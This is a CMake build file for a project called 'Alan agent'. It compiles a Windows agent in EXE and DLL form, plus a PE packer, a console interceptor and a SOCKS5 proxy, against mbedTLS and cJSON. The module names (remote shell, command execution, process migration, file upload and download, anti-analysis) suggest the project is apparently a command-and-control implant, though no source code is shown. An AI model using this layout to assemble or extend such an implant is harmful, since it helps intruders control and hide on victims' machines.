cmake_minimum_required (VERSION 3.20)

project ("Alan agent" C ASM_MASM)

add_definitions(/D_WIN32_WINNT=0x0601)

include_directories(
	"include"
	"cJSON"
	"mbedtls/include"
	"mbedtls/include/mbedtls"
	"windows_agent/include"
)
        
set(mbedtls_srcs	
	"mbedtls/library/aes.c"
	"mbedtls/library/aesni.c"
	"mbedtls/library/arc4.c"
	"mbedtls/library/aria.c"
	"mbedtls/library/asn1parse.c"
	"mbedtls/library/asn1write.c"
	"mbedtls/library/base64.c"
	"mbedtls/library/bignum.c"
	"mbedtls/library/blowfish.c"
	"mbedtls/library/camellia.c"
	"mbedtls/library/ccm.c"
	"mbedtls/library/certs.c"
	"mbedtls/library/chacha20.c"
	"mbedtls/library/chachapoly.c"
	"mbedtls/library/cipher.c"
	"mbedtls/library/cipher_wrap.c"
	"mbedtls/library/cmac.c"
	"mbedtls/library/ctr_drbg.c"
	"mbedtls/library/debug.c"
	"mbedtls/library/des.c"
	"mbedtls/library/dhm.c"
	"mbedtls/library/ecdh.c"
	"mbedtls/library/ecdsa.c"
	"mbedtls/library/ecjpake.c"
	"mbedtls/library/ecp.c"
	"mbedtls/library/ecp_curves.c"
	"mbedtls/library/entropy.c"
	"mbedtls/library/entropy_poll.c"
	"mbedtls/library/error.c"
	"mbedtls/library/gcm.c"
	"mbedtls/library/havege.c"
	"mbedtls/library/hkdf.c"
	"mbedtls/library/hmac_drbg.c"
	"mbedtls/library/md.c"
	"mbedtls/library/md2.c"
	"mbedtls/library/md4.c"
	"mbedtls/library/md5.c"
	"mbedtls/library/memory_buffer_alloc.c"
	"mbedtls/library/net_sockets.c"
	"mbedtls/library/nist_kw.c"
	"mbedtls/library/oid.c"
	"mbedtls/library/padlock.c"
	"mbedtls/library/pem.c"
	"mbedtls/library/pk.c"
	"mbedtls/library/pkcs11.c"
	"mbedtls/library/pkcs12.c"
	"mbedtls/library/pkcs5.c"
	"mbedtls/library/pkparse.c"
	"mbedtls/library/pkwrite.c"
	"mbedtls/library/pk_wrap.c"
	"mbedtls/library/platform.c"
	"mbedtls/library/platform_util.c"
	"mbedtls/library/poly1305.c"
	"mbedtls/library/psa_crypto.c"
	"mbedtls/library/psa_crypto_driver_wrappers.c"
	"mbedtls/library/psa_crypto_se.c"
	"mbedtls/library/psa_crypto_slot_management.c"
	"mbedtls/library/psa_crypto_storage.c"
	"mbedtls/library/psa_its_file.c"
	"mbedtls/library/ripemd160.c"
	"mbedtls/library/rsa.c"
	"mbedtls/library/rsa_internal.c"
	"mbedtls/library/sha1.c"
	"mbedtls/library/sha256.c"
	"mbedtls/library/sha512.c"
	"mbedtls/library/ssl_cache.c"
	"mbedtls/library/ssl_ciphersuites.c"
	"mbedtls/library/ssl_cli.c"
	"mbedtls/library/ssl_cookie.c"
	"mbedtls/library/ssl_msg.c"
	"mbedtls/library/ssl_srv.c"
	"mbedtls/library/ssl_ticket.c"
	"mbedtls/library/ssl_tls.c"
	"mbedtls/library/ssl_tls13_keys.c"
	"mbedtls/library/threading.c"
	"mbedtls/library/timing.c"
	"mbedtls/library/version.c"
	"mbedtls/library/version_features.c"
	"mbedtls/library/x509.c"
	"mbedtls/library/x509write_crt.c"
	"mbedtls/library/x509write_csr.c"
	"mbedtls/library/x509_create.c"
	"mbedtls/library/x509_crl.c"
	"mbedtls/library/x509_crt.c"
	"mbedtls/library/x509_csr.c"
	"mbedtls/library/xtea.c"
)

set(cJSON_srcs 
	"cJSON/cJson.c"
)

set(pe_packer_srcs
	${agent_core_srcs}
	"pe_packer/main.c"
)

set(agent_core_srcs
	"agent/lz4.c" 
	"agent/session.c" 
	"agent/utility.c" 
	"agent/protocol.c" 
	"agent/agent.c"  
	"agent/serializer.c" 
	"agent/registration.c"    
	"agent/filesystem.c"
	"agent/str_builder.c"
	"agent/http.c"
	"agent/network.c"
	"agent/proxy_socks5.c"
	"agent/cmd_download_files.c"
	"agent/cmd_upload_files.c"
	"agent/cmd_sleep.c"
	"agent/cmd_run.c"
	"agent/cmd_shell.c"
	"agent/cmd_migrate.c"
	"agent/cmd_sysinfo.c"
	"agent/cmd_exec.c"
	"agent/cmd_kill.c"
	"agent/cmd_proxy.c"
)

set(windows_agent_srcs
	"windows_agent/win_utility.c"
	"windows_agent/win_shell.c"
	"windows_agent/win_sysinfo.c"
	"windows_agent/win_named_pipe.c"
	"windows_agent/win_event.c"
	"windows_agent/win_main.c"
	"windows_agent/win_process.c"
	"windows_agent/win_anti.c"	
	"windows_agent/win_thread.c"
	"windows_agent/win_network.c"
)

set(windows_agent_asms
	"windows_agent/asm/main.asm"
)

set(windows_agent
	${windows_agent_asms}
	${agent_core_srcs}
	${windows_agent_srcs}	
	${mbedtls_srcs} 
	${cJSON_srcs}	
)

set(windows_console_interceptor_srcs
	${agent_core_srcs}
	${windows_agent_srcs}	  
	${cJSON_srcs}	
	${mbedtls_srcs} 
	${windows_agent_asms}
	"windows_console_interceptor/interceptor.c"
)

set(win32_srcs
	"js_modules/win32/win32.c"
)

set(socks5_srcs
	${agent_core_srcs}
	${windows_agent_srcs}	
	${cJSON_srcs}
	${mbedtls_srcs} 
	${windows_agent_asms}
	"socks5/proxy_main.c"	
)

# artifacts definition
add_library(console_interceptor_dll SHARED
	${windows_console_interceptor_srcs}
	"windows_console_interceptor/dll_main.c"
 )

add_executable(console_interceptor_exe
	${windows_console_interceptor_srcs}
	"windows_console_interceptor/exe_main.c"
 )

add_executable (agent_exe
	"windows_agent/exe_main.c" 
	${windows_agent}	
 )

add_library (agent_dll SHARED 
	"windows_agent/dll_main.c"
	${windows_agent}
 )

add_executable(pe_packer_exe
	${pe_packer_srcs}	
	"pe_packer/exe_main.c"
)

add_library (pe_packer_dll SHARED 
	${pe_packer_srcs}
	"pe_packer/dll_main.c"
)

 add_executable(socks5_exe
	${socks5_srcs}	
)


# set properties
set_source_files_properties(${windows_agent_asms}
    PROPERTIES
		COMPILE_FLAGS "/safeseh"
)


set_target_properties(agent_exe
	PROPERTIES	
		LINK_FLAGS_DEBUG /SUBSYSTEM:WINDOWS
		LINK_FLAGS_RELEASE /SUBSYSTEM:WINDOWS
		COMPILE_FLAGS /MT
)

set_target_properties(agent_dll 
	PROPERTIES	
		LINK_FLAGS_DEBUG /SUBSYSTEM:WINDOWS
		LINK_FLAGS_RELEASE /SUBSYSTEM:WINDOWS
		COMPILE_FLAGS /MT		
)

set_target_properties(pe_packer_exe
	PROPERTIES	
		LINK_FLAGS_DEBUG /SUBSYSTEM:WINDOWS
		LINK_FLAGS_RELEASE /SUBSYSTEM:WINDOWS
		COMPILE_FLAGS /MT
)

set_target_properties(pe_packer_dll 
	PROPERTIES	
		LINK_FLAGS_DEBUG /SUBSYSTEM:WINDOWS
		LINK_FLAGS_RELEASE /SUBSYSTEM:WINDOWS
		COMPILE_FLAGS /MT		
)

set_target_properties(console_interceptor_dll 
	PROPERTIES	
		COMPILE_FLAGS /MT		
)

set_target_properties(console_interceptor_exe
	PROPERTIES	
		LINK_FLAGS_DEBUG /SUBSYSTEM:CONSOLE
		LINK_FLAGS_RELEASE /SUBSYSTEM:CONSOLE
		COMPILE_FLAGS /MT
)

set_target_properties(socks5_exe
	PROPERTIES	
		LINK_FLAGS_DEBUG /SUBSYSTEM:WINDOWS
		LINK_FLAGS_RELEASE /SUBSYSTEM:WINDOWS
		COMPILE_FLAGS /MT
)

add_compile_definitions(CJSON_HIDE_SYMBOLS)